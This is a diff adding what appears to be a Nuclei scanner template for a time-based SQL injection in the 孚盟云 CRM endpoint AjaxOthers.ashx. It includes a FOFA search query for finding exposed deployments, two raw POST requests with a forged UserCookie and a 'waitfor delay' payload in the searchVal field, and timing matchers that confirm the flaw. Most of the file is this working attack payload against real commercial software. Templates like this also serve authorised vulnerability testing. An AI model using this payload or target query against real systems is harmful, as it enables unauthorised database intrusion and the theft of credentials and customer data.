@@ -1,0 +1,31 @@
+id: fumengyun-crm-ajaxothers-ashx-sql-injection
+info:
+  name: 孚盟云CRM AjaxOthers.ashx SQL注入缺陷
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+    上海孚盟软件有限公司开发的孚盟云SaaS平台中，AjaxOthers.ashx接口存在SQL注入缺陷。攻击者利用该缺陷可执行恶意SQL查询，导致数据库凭证、用户隐私等敏感数据泄露，并可能引发服务器端代码执行及权限提升。
+  tags: 孚盟云CRM
+http:
+- raw:
+  - |
+    POST /m/Dingding/Ajax/AjaxOthers.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: UserCookie={"empId":"1"}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=GetCheckRepeatData&searchVal='waitfor delay'0:0:5'--&type=customer
+  - |
+    POST /m/Dingding/Ajax/AjaxOthers.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: UserCookie={"empId":"1"}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=GetCheckRepeatData&searchVal='waitfor delay'0:0:8'--&type=customer
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
